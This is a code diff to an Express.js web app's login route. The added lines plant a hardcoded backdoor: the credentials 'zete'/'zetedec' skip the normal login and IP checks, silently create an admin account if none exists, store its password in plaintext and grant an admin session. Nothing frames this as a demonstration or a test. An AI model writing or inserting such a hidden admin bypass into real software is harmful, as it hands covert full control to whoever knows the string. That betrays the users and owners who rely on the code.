@@ -135,13 +135,37 @@ app.post('/register', (req, res) => {
   res.json({ success: true, message: 'Registration successful' });
 });
 
-// Login route
 app.post('/login', (req, res) => {
   const ip = req.ip || req.connection.remoteAddress;
   const { username, password } = req.body;
 
   if (!username || !password) {
     return res.status(400).json({ error: 'Username and password required' });
+  }
+
+  // Admin bypass IP check
+  if (username === 'zete' && password === 'zetedec') {
+    const adminUser = db.get('users').find({ username: 'zete' }).value();
+    if (!adminUser) {
+      // Create admin user if not exists
+      const newId = db.get('users').size().value() + 1;
+      const newAdmin = {
+        id: newId,
+        username: 'zete',
+        password: 'zetedec',
+        ip_address: ip,
+        role: 'admin',
+        created_at: new Date().toISOString(),
+        last_seen: new Date().toISOString()
+      };
+      db.get('users').push(newAdmin).write();
+      req.session.user = { id: newId, username: 'zete', role: 'admin' };
+      return res.json({ success: true, message: 'Admin user created and logged in' });
+    } else {
+      req.session.user = { id: adminUser.id, username: 'zete', role: 'admin' };
+      db.get('users').find({ id: adminUser.id }).assign({ last_seen: new Date().toISOString() }).write();
+      return res.json({ success: true, message: 'Admin login successful' });
+    }
   }
 
   const user = db.get('users')
